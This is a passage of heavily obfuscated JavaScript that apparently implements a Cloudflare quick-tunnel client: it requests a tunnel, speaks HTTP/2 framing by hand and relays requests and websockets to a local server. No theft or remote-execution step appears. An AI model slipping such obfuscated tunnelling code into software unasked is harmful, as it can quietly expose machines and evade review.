                'SObGN': b[e0(0x7ca)],
                'fEUOn': b['ThgdR']
            };
        let g;
        try {
            g = new URL(a[e0(0x655)](/\/+$/, '') + b[e0(0x200)]);
        } catch (j) {
            b[e0(0x15a)](d, new Error(b[e0(0x147)] + j[e0(0x49d)]));
            return;
        }
        const h = b[e0(0x865)](g[e0(0x79b)], b[e0(0x87b)]) ? a0h : a0g, i = h[e0(0x543)](g, {
                'method': b['hkPMk'],
                'headers': {
                    'Content-Type': e0(0x6af),
                    'User-Agent': b['pSSSg']
                },
                'timeout': 0x3a98
            }, k => {
                const e3 = e0, l = [];
                k['on'](f[e3(0x42f)], m => l[e3(0x75e)](m)), k['on'](f[e3(0x3b4)], d), k['on'](f[e3(0x54d)], () => {
                    const e4 = e3, m = Buffer[e4(0x322)](l), n = k[e4(0x7d8)];
                    let o;
                    try {
                        o = JSON[e4(0x7f4)](m[e4(0x491)](f[e4(0x229)]));
                    } catch (q) {
                        d(new Error(f[e4(0x6c1)](f[e4(0x79a)]('quick\x20tunnel\x20returned\x20non-JSON\x20(', n) + f[e4(0x6c7)], m[e4(0x16b)](0x0, 0x12c)[e4(0x491)](f[e4(0x229)]))));
                        return;
                    }
                    const p = o['result'] || {};
                    if (!(o['success'] ?? !![]) || !p) {
                        f[e4(0x6de)](d, new Error(f[e4(0x79a)](f[e4(0x64a)], JSON[e4(0x548)](o[e4(0x51d)]))));
                        return;
                    }
                    try {
                        const r = f[e4(0x146)](String, p['id']);
                        if (!a0at[e4(0x731)](r))
                            throw new Error(f[e4(0x20a)]);
                        if (f[e4(0x501)](typeof p[e4(0x394)], f[e4(0x73f)]) || f[e4(0x5b8)](typeof p[e4(0x4c1)], f[e4(0x73f)]))
                            throw new Error(e4(0x73c));
                        const s = f[e4(0x2b2)](a0as, p[e4(0x393)]), t = Buffer[e4(0x68c)](r['replace'](/-/g, ''), f[e4(0x913)]);
                        f[e4(0x109)](c, [
                            p[e4(0x4c1)],
                            p[e4(0x394)],
                            s,
                            t
                        ]);
                    } catch (u) {
                        f['LCzxr'](d, new Error(f[e4(0x30e)] + u[e4(0x49d)]));
                    }
                });
            });
        i['on'](b['hRdJf'], k => d(new Error(e0(0x8ec) + k[e0(0x49d)]))), i['end']();
    });
}
function a0av(a) {
    const e5 = a0aY;
    return a['map'](([b, c]) => Buffer[e5(0x68c)](b, 'utf8')[e5(0x491)]('base64')[e5(0x655)](/=+$/, '') + ':' + Buffer[e5(0x68c)](c, e5(0x3ef))['toString'](e5(0x880))['replace'](/=+$/, ''))[e5(0x52c)](';');
}
class a0aw {
    constructor(a) {
        const e6 = a0aY, b = {
                'rEdVT': e6(0x4b7),
                'TzlLk': e6(0x318),
                'UIHrq': e6(0x92b)
            }, c = b[e6(0x6b2)][e6(0x140)]('|');
        let d = 0x0;
        while (!![]) {
            switch (c[d++]) {
            case '0':
                this[e6(0x4f3)] = null;
                continue;
            case '1':
                this[e6(0x782)] = [];
                continue;
            case '2':
                this[e6(0x2cd)] = Buffer[e6(0x744)](0x0);
                continue;
            case '3':
                a['on']('error', f => {
                    const e7 = e6;
                    this[e7(0x4f3)] = f, this[e7(0x8f6)]();
                });
                continue;
            case '4':
                a['on'](b['TzlLk'], f => {
                    const e8 = e6;
                    this['buffer'] = this[e8(0x2cd)]['length'] ? Buffer['concat']([
                        this['buffer'],
                        f
                    ]) : f, this['_drain']();
                });
                continue;
            case '5':
                a['on'](e6(0x71e), () => {
                    const e9 = e6;
                    this[e9(0x5c0)] = !![], this['_drain']();
                });
                continue;
            case '6':
                this[e6(0x5c0)] = ![];
                continue;
            case '7':
                this[e6(0x4cc)] = a;
                continue;
            case '8':
                a['on'](b[e6(0x378)], () => {
                    this['closed'] = !![], this['_drain']();
                });
                continue;
            }
            break;
        }
    }
    [a0aY(0x8f6)]() {
        const ea = a0aY, a = {
                'nAlBw': function (b, c) {
                    return b >= c;
                },
                'sVMmC': function (b, c) {
                    return b !== c;
                },
                'sdqZy': ea(0x788)
            };
        while (this[ea(0x782)]['length'] > 0x0) {
            const b = this['waiters'][0x0];
            if (a[ea(0x29e)](this['buffer'][ea(0x7a3)], b['need'])) {
                this[ea(0x782)][ea(0x1d7)]();
                const c = this[ea(0x2cd)][ea(0x16b)](0x0, b['need']);
                this[ea(0x2cd)] = this[ea(0x2cd)][ea(0x16b)](b[ea(0x8f7)]), b[ea(0x928)](c);
            } else {
                if (a[ea(0x38b)](this[ea(0x4f3)], null))
                    this[ea(0x782)][ea(0x1d7)](), b[ea(0x657)](this[ea(0x4f3)]);
                else {
                    if (this[ea(0x5c0)])
                        this[ea(0x782)][ea(0x1d7)](), b[ea(0x657)](new Error(a[ea(0xfe)]));
                    else
                        break;
                }
            }
        }
    }
    [a0aY(0x40b)](a) {
        const eb = a0aY, b = {
                'ZslQh': function (c, d) {
                    return c >= d;
                },
                'hcmry': 'connection\x20closed'
            };
        if (this[eb(0x4f3)] !== null)
            return Promise[eb(0x657)](this[eb(0x4f3)]);
        if (b[eb(0x1fc)](this['buffer']['length'], a)) {
            const c = this[eb(0x2cd)][eb(0x16b)](0x0, a);
            return this[eb(0x2cd)] = this[eb(0x2cd)][eb(0x16b)](a), Promise[eb(0x928)](c);
        }
        if (this[eb(0x5c0)])
            return Promise[eb(0x657)](new Error(b['hcmry']));
        return new Promise((d, f) => {
            const ec = eb;
            this['waiters'][ec(0x75e)]({
                'need': a,
                'resolve': d,
                'reject': f
            }), this[ec(0x8f6)]();
        });
    }
}
class a0ax {
    constructor(a, b, c, d, f, g, h, i = null, j = ![], k = null) {
        const ed = a0aY, l = { 'KJyjR': ed(0x890) }, m = l[ed(0x732)][ed(0x140)]('|');
        let n = 0x0;
        while (!![]) {
            switch (m[n++]) {
            case '0':
                this[ed(0x156)] = new Map();
                continue;
            case '1':
                this[ed(0x5ea)] = j;
                continue;
            case '2':
                this[ed(0x6a0)] = null;
                continue;
            case '3':
                this[ed(0x36c)] = [];
                continue;
            case '4':
                this[ed(0x7be)] = a0a6;
                continue;
            case '5':
                this[ed(0x10d)] = h;
                continue;
            case '6':
                this['tunnelSecret'] = d;
                continue;
            case '7':
                this[ed(0x1a9)] = new a0aw(a);
                continue;
            case '8':
                this[ed(0x712)] = ![];
                continue;
            case '9':
                this[ed(0x6b5)] = new Map();
                continue;
            case '10':
                this[ed(0x6f0)] = b;
                continue;
            case '11':
                this[ed(0x294)] = new a0af();
                continue;
            case '12':
                this[ed(0x539)] = ![];
                continue;
            case '13':
                this[ed(0x1a1)] = c;
                continue;
            case '14':
                this[ed(0x761)] = g;
                continue;
            case '15':
                this[ed(0x53e)] = k || { 'printed': ![] };
                continue;
            case '16':
                this['stopped'] = ![];
                continue;
            case '17':
                this[ed(0x817)] = i;
                continue;
            case '18':
                this[ed(0x2be)] = f;
                continue;
            case '19':
                this[ed(0x12e)] = a;
                continue;
            case '20':
                this[ed(0x44c)] = 0xffff;
                continue;
            }
            break;
        }
    }
    ['sendFrame'](a, b, c, d = Buffer['alloc'](0x0)) {
        const ee = a0aY, f = {
                'VzEjO': function (h, i) {
                    return h > i;
                },
                'Tnlrf': ee(0x400),
                'wLjKB': function (h, i) {
                    return h & i;
                }
            };
        if (f[ee(0x766)](d[ee(0x7a3)], 0xffffff))
            throw new Error(f['Tnlrf']);
        const g = Buffer[ee(0x744)](0x9);
        g[ee(0x490)](d[ee(0x7a3)], 0x0, 0x3), g[0x3] = a, g[0x4] = b, g[ee(0x41e)](f[ee(0x6cf)](c, 0x7fffffff), 0x5), this[ee(0x12e)][ee(0x2c2)](Buffer['concat']([
            g,
            d
        ]));
    }
    [a0aY(0xf3)](a, b, c = ![]) {
        const ef = a0aY, d = {
                'GIIeO': function (h, i) {
                    return h(i);
                },
                'pDhdc': function (h, i) {
                    return h | i;
                }
            }, f = d[ef(0x8c7)](a0ai, b), g = d[ef(0x445)](0x4, c ? 0x1 : 0x0);
        this[ef(0x480)](0x1, g, a, f);
    }
    ['_waitWindow'](a) {
        const eg = a0aY, b = {
                'YPfMP': function (c, d) {
                    return c > d;
                }
            };
        if (this[eg(0x44c)] > 0x0 && b[eg(0x470)](this[eg(0x156)][eg(0x1f2)](a) ?? 0xffff, 0x0))
            return Promise[eg(0x928)]();
        return new Promise(c => {
            const eh = eg;
            this[eh(0x36c)][eh(0x75e)]({
                'streamId': a,
                'resolve': c
            });
        });
    }
    ['_notifyWindows']() {
        const ei = a0aY, a = {
                'uUoBa': function (c, d) {
                    return c > d;
                },
                'vcZwS': function (c, d) {
                    return c > d;
                }
            }, b = [];
        for (const c of this[ei(0x36c)]) {
            const d = this[ei(0x156)][ei(0x1f2)](c[ei(0x23c)]) ?? 0xffff;
            a['uUoBa'](this['connectionWindow'], 0x0) && a[ei(0x7f9)](d, 0x0) ? c[ei(0x928)]() : b[ei(0x75e)](c);
        }
        this[ei(0x36c)] = b;
    }
    [a0aY(0x4bb)]() {
        const ej = a0aY;
        for (const a of this[ej(0x36c)]) {
            a['resolve']();
        }
        this[ej(0x36c)] = [];
    }
    async [a0aY(0x319)](a, b, c = ![]) {
        const ek = a0aY, d = {
                'PCbVG': function (h, i) {
                    return h - i;
                },
                'Aqhbt': function (h, i) {
                    return h >= i;
                },
                'NaDcM': function (h, i) {
                    return h + i;
                }
            }, f = b[ek(0x7a3)];
        let g = 0x0;
        do {
            await this[ek(0x311)](a);
            if (this[ek(0x3a0)])
                return;
            const h = this['streamWindows']['get'](a) ?? 0xffff, i = Math[ek(0x5df)](d[ek(0x6f7)](f, g), this['connectionWindow'], h, this[ek(0x7be)]), j = c && d[ek(0x485)](g + i, f) ? 0x1 : 0x0, k = b[ek(0x16b)](g, d[ek(0x1c9)](g, i));
            this['connectionWindow'] -= i, this[ek(0x156)][ek(0x50d)](a, h - i), this[ek(0x480)](0x0, j, a, k), g += i;
        } while (g < f);
    }
    [a0aY(0x320)](a, b) {
        const el = a0aY;
        if (b > 0x0) {
            const c = Buffer['alloc'](0x4);
            c[el(0x41e)](b & 0x7fffffff, 0x0), this['sendFrame'](0x8, 0x0, a, c);
        }
    }
    async ['readFrame']() {
        const em = a0aY, a = await this[em(0x1a9)]['readExact'](0x9), b = a[em(0x697)](0x0, 0x3), c = a[0x3], d = a[0x4], f = a[em(0x326)](0x5) & 0x7fffffff, g = await this[em(0x1a9)][em(0x40b)](b);
        return [
            c,
            d,
            f,
            g
        ];
    }
    async [a0aY(0x804)](a, b, c) {
        const en = a0aY, d = {
                'nTIdK': function (g, h) {
                    return g > h;
                },
                'tJfjg': 'invalid\x20HTTP/2\x20padding',
                'mkzKj': function (g, h) {
                    return g !== h;
                },
                'HAiKq': en(0x740)
            };
        if (a & 0x8) {
            const g = c[0x0];
            c = c[en(0x16b)](0x1);
            if (d[en(0x6f6)](g, c[en(0x7a3)]))
                throw new Error(d[en(0x80f)]);
            c = g ? c[en(0x16b)](0x0, c['length'] - g) : c;
        }
        a & 0x20 && (c = c[en(0x16b)](0x5));
        const f = [c];
        while (!(a & 0x4)) {
            const h = await this[en(0x132)]();
            if (d['mkzKj'](h[0x0], 0x9) || d[en(0x70c)](h[0x2], b))
                throw new Error(d['HAiKq']);
            f[en(0x75e)](h[0x3]), a = h[0x1];
        }
        return this[en(0x294)][en(0x332)](Buffer['concat'](f));
    }
    [a0aY(0x5e8)](a) {
        const eo = a0aY, b = {
                'xnMcw': function (c, d) {
                    return c !== d;
                }
            };
        if (b[eo(0x137)](this[eo(0x6a0)], null))
            return;
        this['control'] = new a0az(this, a, this[eo(0x10d)]), this[eo(0xf3)](a, [[
                eo(0x82f),
                eo(0x1fd)
            ]]), this[eo(0x6a0)][eo(0x15f)](this[eo(0x1a1)], this[eo(0x1f5)], this[eo(0x2be)], this[eo(0x761)]);
    }
    ['updateConfig'](a, b) {
        const ep = a0aY, c = {
                'VfiOm': 'utf8',
                'UUqou': function (g, h, i) {
                    return g(h, i);
                },
                'GWZcH': ep(0x82f),
                'ovjol': '200',
                'jWRMH': 'content-type',
                'wMPrw': 'content-length',
                'MmcQT': function (g, h) {
                    return g(h);
                }
            };
        let d = 0x0;
        try {
            const g = JSON[ep(0x7f4)](b[ep(0x7a3)] ? b['toString'](c[ep(0x1df)]) : '{}'), h = c[ep(0x2fa)](parseInt, g[ep(0x497)], 0xa);
            !Number[ep(0x1a0)](h) && (d = h);
        } catch (i) {
        }
        const f = Buffer[ep(0x68c)](JSON['stringify']({ 'latestAppliedVersion': d }));
        this[ep(0xf3)](a, [
            [
                c[ep(0x664)],
                c[ep(0x212)]
            ],
            [
                c['jWRMH'],
                ep(0x6af)
            ],
            [
                c[ep(0x368)],
                c['MmcQT'](String, f[ep(0x7a3)])
            ]
        ]), this['sendData'](a, f, !![]);
    }
    [a0aY(0x124)](a, b) {
        const eq = a0aY, c = { 'jFAci': eq(0x67d) }, d = c[eq(0x849)][eq(0x140)]('|');
        let f = 0x0;
        while (!![]) {
            switch (d[f++]) {
            case '0':
                b['finished'] = !![];
                continue;
            case '1':
                this[eq(0x5a4)](a, b)['catch'](() => {
                });
                continue;
            case '2':
                if (b[eq(0x5a0)])
                    return;
                continue;
            case '3':
                if (b[eq(0x65a)] === 'update-configuration') {
                    this[eq(0x4a8)](a, Buffer['concat'](b[eq(0x411)]));
                    return;
                }
                continue;
            case '4':
                if (b[eq(0x6ae)])
                    return;
                continue;
            }
            break;
        }
    }
    async [a0aY(0x5a4)](a, b) {
        const er = a0aY, c = {
                'kPSUp': function (d, f, g, h, i, j) {
                    return d(f, g, h, i, j);
                },
                'IfeGS': function (d, f) {
                    return d === f;
                },
                'RjexE': er(0x31c),
                'DzlFF': 'cf-int-',
                'okDly': er(0x310),
                'WPeQI': 'cf-proxy-',
                'TPLOV': er(0x23f),
                'tRcEk': function (d, f) {
                    return d === f;
                },
                'ieXxG': er(0x65a),
                'YTmQA': er(0x560),
                'iwOYn': function (d, f) {
                    return d(f);
                },
                'PDdPb': er(0x228),
                'qnqPn': er(0x82f),
                'DMNSu': 'cf-cloudflared-response-headers',
                'JFCVa': er(0x857),
                'QILbI': er(0x468),
                'AKpKT': function (d, f) {
                    return d + f;
                },
                'trHCz': function (d, f) {
                    return d + f;
                },
                'ltezo': 'stream\x20',
                'HcdUl': er(0x39d)
            };
        try {
            const d = await c['kPSUp'](a0aC, this[er(0x6f0)], b['method'], b[er(0x312)], b[er(0x6a2)], Buffer[er(0x322)](b['body'])), f = [], g = [];
            for (const [k, l] of d[er(0x6a2)]) {
                const m = k['toLowerCase']();
                c[er(0x584)](m, c[er(0x4ce)]) && g[er(0x75e)]([
                    m,
                    l
                ]);
                const n = m[er(0x627)](c['DzlFF']) || m['startsWith'](c['okDly']) || m[er(0x627)](c[er(0x3a1)]) || m[er(0x627)](':');
                (!n || c[er(0x584)](m, c[er(0x4e9)]) || c[er(0x87e)](m, c[er(0x2fe)]) || m === c[er(0x4ac)]) && f[er(0x75e)]([
                    m,
                    l
                ]);
            }
            if (!f[er(0x190)](([o]) => o === 'content-type')) {
                const o = c['iwOYn'](a0ar, b['path']);
                o && f[er(0x75e)]([
                    c[er(0x369)],
                    o
                ]);
            }
            const h = c[er(0x2aa)](a0av, f), i = c[er(0x87e)](d['status'], 0x65) ? 0xc8 : d['status'], j = [
                    [
                        c['qnqPn'],
                        String(i)
                    ],
                    ...g,
                    [
                        c[er(0x6d5)],
                        h
                    ],
                    [
                        c[er(0x590)],
                        c[er(0x7d0)]
                    ]
                ];
            this[er(0xf3)](a, j);
            for await (const p of d['body']) {
                await this[er(0x319)](a, p, ![]);
            }
            await this[er(0x319)](a, Buffer[er(0x744)](0x0), !![]);
        } catch (q) {
            this[er(0x10d)]['warning'](c[er(0x5e9)](c['trHCz'](c[er(0x794)](c[er(0x374)], a), '\x20proxy\x20failed:\x20'), q));
            try {
                this['sendHeaders'](a, [[
                        er(0x82f),
                        c['HcdUl']
                    ]], !![]);
            } catch (r) {
            }
        }
    }
    async [a0aY(0x796)]() {
        const es = a0aY, a = {
                'UaSKu': es(0x515),
                'LkCec': function (d, f) {
                    return d % f;
                },
                'yRfCe': es(0xef),
                'oqwqZ': function (d, f) {
                    return d < f;
                },
                'ftlKJ': function (d, f) {
                    return d + f;
                },
                'DBAso': function (d, f) {
                    return d === f;
                },
                'TjiSz': function (d, f) {
                    return d - f;
                },
                'CDxuK': function (d, f) {
                    return d >= f;
                },
                'OlYmU': function (d, f) {
                    return d <= f;
                },
                'iQXep': function (d, f) {
                    return d === f;
                },
                'dzjic': function (d, f) {
                    return d & f;
                },
                'zVWZg': function (d, f) {
                    return d !== f;
                },
                'GgBux': function (d, f) {
                    return d === f;
                },
                'rEZHb': function (d, f) {
                    return d === f;
                },
                'ZfvVQ': function (d, f) {
                    return d === f;
                }
            }, b = await this[es(0x1a9)]['readExact'](0x18);
        if (!b[es(0x791)](Buffer[es(0x68c)](a['UaSKu'])))
            throw new Error(es(0x5bc));
        const c = Buffer['alloc'](0x6);
        c['writeUInt16BE'](0x3, 0x0), c[es(0x41e)](0x64, 0x2), this[es(0x480)](0x4, 0x0, 0x0, c);
        this[es(0x5ea)] && !this[es(0x53e)][es(0x694)] && (process[es(0x8da)][es(0x2c2)](this['tunnelUrl'] + '\x0a'), this[es(0x53e)][es(0x694)] = !![]);
        try {
            while (!this[es(0x3a0)]) {
                const [d, f, g, h] = await this['readFrame']();
                if (d === 0x4) {
                    if (!(f & 0x1)) {
                        if (a[es(0x663)](h[es(0x7a3)], 0x6))
                            throw new Error(a['yRfCe']);
                        for (let i = 0x0; a[es(0x5f6)](i, h['length']); i += 0x6) {
                            const j = h['readUInt16BE'](i), k = h[es(0x326)](a[es(0x52f)](i, 0x2));
                            if (a['DBAso'](j, 0x4)) {
                                const l = a[es(0x1d0)](k, 0xffff);
                                for (const m of this[es(0x156)][es(0x84b)]()) {
                                    this[es(0x156)]['set'](m, Math[es(0x434)](0x0, a[es(0x52f)](this[es(0x156)][es(0x1f2)](m), l)));
                                }
                            } else
                                a[es(0x853)](j, 0x5) && a[es(0x55b)](k, 0x4000) && a[es(0x42e)](k, 0xffffff) && (this[es(0x7be)] = k);
                        }
                        this['sendFrame'](0x4, 0x1, 0x0);
                    }
                    continue;
                }
                if (a[es(0x8bd)](d, 0x6)) {
                    !a[es(0x7a7)](f, 0x1) && this['sendFrame'](0x6, 0x1, 0x0, h);
                    continue;
                }
                if (d === 0x8) {
                    if (a['zVWZg'](h[es(0x7a3)], 0x4))
                        continue;
                    const n = a['dzjic'](h[es(0x326)](0x0), 0x7fffffff);
                    a[es(0x51a)](g, 0x0) ? this[es(0x44c)] += n : this[es(0x156)][es(0x50d)](g, a['ftlKJ'](this[es(0x156)][es(0x1f2)](g) ?? 0xffff, n));
                    this[es(0x414)]();
                    continue;
                }
                if (d === 0x3) {
                    this[es(0x6b5)][es(0x59d)](g);
                    continue;
                }
                if (d === 0x7)
                    break;
                if (a[es(0x61c)](d, 0x1)) {
                    const o = await this[es(0x804)](f, g, h);
                    !this[es(0x156)][es(0x4d3)](g) && this['streamWindows'][es(0x50d)](g, 0xffff);
                    this[es(0x467)](g, f, o);
                    continue;
                }
                if (a[es(0x700)](d, 0x0)) {
                    this[es(0x538)](g, f, h);
                    continue;
                }
            }
        } finally {
            this['stopped'] = !![], this[es(0x4bb)]();
            for (const p of this[es(0x6b5)][es(0x2ac)]()) {
                p[es(0x537)] && p['websocketProxy'][es(0x32f)]();
            }
            try {
                this['sock'][es(0x1f0)]();
            } catch (q) {
            }
        }
    }
    [a0aY(0x467)](a, b, c) {
        const et = a0aY, d = {
                'HXGpB': function (i, j) {
                    return i === j;
                },
                'dAkgI': function (i, j) {
                    return i & j;
                },
                'nItgn': et(0x5a9),
                'pLGMo': et(0x6a3),
                'dRALp': et(0x19e),
                'dNvde': et(0x6db),
                'NJJEb': et(0x5a0),
                'ZYBDd': et(0x277),
                'czxJs': function (i, j) {
                    return i(j);
                }
            }, f = {};
        for (const [i, j] of c) {
            i['startsWith'](':') ? f[i] = j : f[i[et(0x1a2)]()] = j;
        }
        const g = (f[a0a4] || '')[et(0x63e)]()[et(0x1a2)]();
        if (d[et(0x496)](g, a0a5)) {
            this['openControl'](a);
            d[et(0x47a)](b, 0x1) && (this[et(0x6a0)][et(0x6ae)] = !![]);
            return;
        }
        const h = {
            'method': f[d[et(0x58d)]] || d[et(0x1bc)],
            'path': f[d[et(0x64f)]] || '/',
            'authority': f[d['dNvde']] || '',
            'headers': c[et(0x896)](([k]) => !k['startsWith'](':')),
            'body': [],
            'upgrade': g,
            'websocket': g === d[et(0x738)] || d[et(0x496)]((f[d[et(0x881)]] || '')[et(0x1a2)](), d['NJJEb']),
            'ended': d[et(0x4a7)](Boolean, d[et(0x47a)](b, 0x1)),
            'finished': ![]
        };
        this[et(0x6b5)]['set'](a, h);
        if (h[et(0x5a0)])
            h[et(0x537)] = new a0ay(this, a, h, this[et(0x6f0)], this[et(0x10d)]), h['websocketProxy'][et(0x15f)]();
        else
            h[et(0x630)] && this['requestFinished'](a, h);
    }
    [a0aY(0x538)](a, b, c) {
        const eu = a0aY, d = {
                'dBmiR': function (g, h) {
                    return g === h;
                },
                'USnJx': function (g, h) {
                    return g === h;
                },
                'dzUcu': function (g, h) {
                    return g !== h;
                },
                'LCLyH': function (g, h) {
                    return g(h);
                },
                'qZktg': function (g, h) {
                    return g & h;
                },
                'urthH': function (g, h) {
                    return g & h;
                }
            };
        this[eu(0x320)](0x0, c[eu(0x7a3)]), this['sendWindowUpdate'](a, c[eu(0x7a3)]);
        if (this[eu(0x6a0)] !== null && d[eu(0x604)](this[eu(0x6a0)][eu(0x23c)], a)) {
            this[eu(0x6a0)]['feed'](c);
            b & 0x1 && (this[eu(0x6a0)][eu(0x6ae)] = !![]);
            return;
        }
        const f = this[eu(0x6b5)][eu(0x1f2)](a);
        if (d['USnJx'](f, undefined))
            return;
        if (d[eu(0x68a)](f[eu(0x537)], undefined)) {
            f[eu(0x537)][eu(0x4a4)](c, d[eu(0x2b1)](Boolean, d[eu(0x1da)](b, 0x1)));
            return;
        }
        c[eu(0x7a3)] && f[eu(0x411)][eu(0x75e)](c), d[eu(0x327)](b, 0x1) && (f['ended'] = !![], this[eu(0x124)](a, f));
    }
}
class a0ay {
    constructor(a, b, c, d, f) {
        const ev = a0aY, g = ev(0x4c9)[ev(0x140)]('|');
        let h = 0x0;
        while (!![]) {
            switch (g[h++]) {
            case '0':
                this['request'] = c;
                continue;
            case '1':
                this[ev(0x10d)] = f;
                continue;
            case '2':
                this[ev(0x3a0)] = ![];
                continue;
            case '3':
                this[ev(0x782)] = [];
                continue;
            case '4':
                this[ev(0x12e)] = null;
                continue;
            case '5':
                this[ev(0x6f0)] = d;
                continue;
            case '6':
                this[ev(0x23c)] = b;
                continue;
            case '7':
                this[ev(0x227)] = [];
                continue;
            case '8':
                this[ev(0x23f)] = a;
                continue;
            }
            break;
        }
    }
    ['start']() {
        const ew = a0aY;
        this[ew(0x796)]()[ew(0x7ea)](() => {
        });
    }
    [a0aY(0x4a4)](a, b = ![]) {
        const ex = a0aY;
        a[ex(0x7a3)] && this['queue']['push'](a), b && this['queue'][ex(0x75e)](null), this['_wake']();
    }
    [a0aY(0x32f)]() {
        const ey = a0aY, a = {
                'URdbl': function (b, c) {
                    return b !== c;
                }
            };
        if (this['stopped'])
            return;
        this[ey(0x3a0)] = !![], this[ey(0x5b7)]();
        if (a[ey(0x7a8)](this[ey(0x12e)], null))
            try {
                this[ey(0x12e)][ey(0x1f0)]();
            } catch (b) {
            }
    }
    [a0aY(0x5b7)]() {
        const ez = a0aY, a = {
                'jHsKk': function (b) {
                    return b();
                }
            };
        for (const b of this[ez(0x782)]) {
            a[ez(0x300)](b);
        }
        this[ez(0x782)] = [];
    }
    async [a0aY(0x342)]() {
        const eA = a0aY;
        while (!this[eA(0x3a0)]) {
            if (this[eA(0x227)][eA(0x7a3)])
                return this[eA(0x227)][eA(0x1d7)]();
            await new Promise(a => this['waiters']['push'](a));
        }
        return null;
    }
    async [a0aY(0x796)]() {
        const eB = a0aY, a = {
                'aJJpz': function (b, c) {
                    return b(c);
                },
                'wvMqf': function (b, c) {
                    return b === c;
                },
                'UxHvK': 'content-length',
                'dQWUM': eB(0x310),
                'pdFuu': eB(0x359),
                'bTbLm': function (b, c) {
                    return b === c;
                },
                'gHhSv': eB(0x23f),
                'YNgmz': 'upgrade',
                'ngSlV': eB(0x560),
                'MFjXY': function (b, c) {
                    return b === c;
                },
                'AHsJN': eB(0x82f),
                'WicHr': 'cf-cloudflared-response-meta',
                'zkYsR': eB(0x468),
                'gVWLO': function (b, c) {
                    return b + c;
                },
                'wubPd': function (b, c) {
                    return b + c;
                },
                'RuNRe': eB(0x160),
                'bNXUh': eB(0x61a),
                'RwGXw': '502'
            };
        try {
            this[eB(0x12e)] = await a[eB(0x4c7)](a0aA, this[eB(0x6f0)]), this[eB(0x856)]();
            const b = await a[eB(0x4c7)](a0aD, this[eB(0x12e)]), c = [], d = [];
            for (const [i, j] of b[eB(0x6a2)]) {
                const k = i[eB(0x1a2)]();
                a[eB(0x1d9)](k, a['UxHvK']) && d['push']([
                    k,
                    j
                ]);
                const l = k[eB(0x627)]('cf-int-') || k[eB(0x627)](a[eB(0x460)]) || k[eB(0x627)](a[eB(0x8e0)]) || k['startsWith'](':');
                (!l || a[eB(0x516)](k, a[eB(0x550)]) || k === a[eB(0x845)] || k === a['ngSlV']) && c[eB(0x75e)]([
                    k,
                    j
                ]);
            }
            const f = a0av(c), g = a[eB(0x88f)](b[eB(0x59c)], 0x65) ? 0xc8 : b[eB(0x59c)], h = [
                    [
                        a[eB(0x158)],
                        String(g)
                    ],
                    ...d,
                    [
                        eB(0x1b5),
                        f
                    ],
                    [
                        a[eB(0x69a)],
                        a[eB(0x14e)]
                    ]
                ];
            this[eB(0x23f)][eB(0xf3)](this[eB(0x23c)], h), this[eB(0x46f)]()[eB(0x7ea)](() => {
            }), await this[eB(0x8a5)](b[eB(0x1a7)]);
        } catch (m) {
            this['log']['warning'](a['gVWLO'](a[eB(0x305)](a['wubPd'](a[eB(0x2da)], this[eB(0x23c)]), a[eB(0x23a)]), m));
            try {
                this['connection'][eB(0xf3)](this[eB(0x23c)], [[
                        a[eB(0x158)],
                        a['RwGXw']
                    ]], !![]);
            } catch (n) {
            }
        } finally {
            this[eB(0x32f)]();
        }
    }
    async [a0aY(0x8a5)](a) {
        const eC = a0aY;
        a[eC(0x7a3)] && await this[eC(0x23f)][eC(0x319)](this[eC(0x23c)], a, ![]);
        for await (const b of this[eC(0x12e)]) {
            if (this[eC(0x3a0)])
                break;
            await this[eC(0x23f)]['sendData'](this[eC(0x23c)], b, ![]);
        }
        !this[eC(0x3a0)] && await this['connection'][eC(0x319)](this[eC(0x23c)], Buffer['alloc'](0x0), !![]);
    }
    async [a0aY(0x46f)]() {
        const eD = a0aY, a = {
                'arbfG': function (b, c) {
                    return b === c;
                }
            };
        while (!this[eD(0x3a0)]) {
            const b = await this[eD(0x342)]();
            if (a[eD(0x263)](b, null))
                return;
            try {
                this[eD(0x12e)]['write'](b);
            } catch (c) {
                this[eD(0x3a0)] = !![];
                return;
            }
        }
    }
    ['sendHandshake']() {
        const eE = a0aY, a = {
                'NchoJ': function (i, j) {
                    return i + j;
                },
                'MuBUI': function (i, j) {
                    return i + j;
                },
                'WWyYJ': eE(0x520),
                'eUlFw': eE(0x143),
                'izLow': function (i, j) {
                    return i === j;
                },
                'rQczx': 'connection',
                'tdBtr': function (i, j) {
                    return i === j;
                },
                'HRFDh': eE(0x65a),
                'XsYTD': function (i, j) {
                    return i === j;
                },
                'tXJAr': eE(0x31c),
                'nxEVw': function (i, j) {
                    return i === j;
                },
                'GuFPW': function (i, j) {
                    return i === j;
                },
                'OmEbC': 'sec-websocket-key',
                'JzOfl': eE(0x6f0),
                'PpfKF': function (i, j) {
                    return i + j;
                },
                'aEeie': function (i, j) {
                    return i + j;
                },
                'wNrHZ': 'Origin:\x20https://',
                'eqrId': eE(0x7f6),
                'FKIFI': eE(0x7fa),
                'VnhAF': 'Upgrade:\x20websocket',
                'YlogI': eE(0x43c),
                'lfLeD': 'latin1'
            }, b = new URL(this[eE(0x6f0)]), c = this[eE(0x543)][eE(0x312)]['startsWith']('/') ? this[eE(0x543)]['path'] : a[eE(0x34c)]('/', this[eE(0x543)][eE(0x312)]), d = [a[eE(0x6be)](a[eE(0x261)], c) + '\x20HTTP/1.1'];
        let f = ![], g = ![], h = ![];
        for (const [i, j] of this['request'][eE(0x6a2)]) {
            const k = i['toLowerCase']();
            if (k === a[eE(0x2c1)] || a[eE(0x718)](k, a[eE(0x193)]) || a[eE(0x7fe)](k, a['HRFDh']) || a[eE(0x5e0)](k, a[eE(0x871)]) || a[eE(0x901)](k, eE(0x207)))
                continue;
            if (a[eE(0x5c3)](k, a[eE(0x26d)]))
                f = !![];
            else {
                if (k === eE(0x37d))
                    g = !![];
                else
                    a[eE(0x901)](k, a[eE(0x20c)]) && (h = !![]);
            }
            d[eE(0x75e)](a['NchoJ'](a[eE(0x73d)](i, ':\x20'), j));
        }
        d[eE(0x75e)](a[eE(0x34c)]('Host:\x20', b[eE(0x143)])), !h && this[eE(0x543)][eE(0x50e)] && d[eE(0x75e)](a[eE(0x433)](a['wNrHZ'], this['request'][eE(0x50e)])), !f && d[eE(0x75e)](a['MuBUI'](eE(0x11e), a0k['randomBytes'](0x10)[eE(0x491)](eE(0x880)))), !g && d[eE(0x75e)](a[eE(0x6c0)]), d[eE(0x75e)](a[eE(0x6d6)]), d[eE(0x75e)](a[eE(0x177)]), this[eE(0x12e)][eE(0x2c2)](Buffer[eE(0x68c)](a[eE(0x6be)](d['join']('\x0d\x0a'), a[eE(0x48b)]), a['lfLeD']));
    }
}
class a0az {
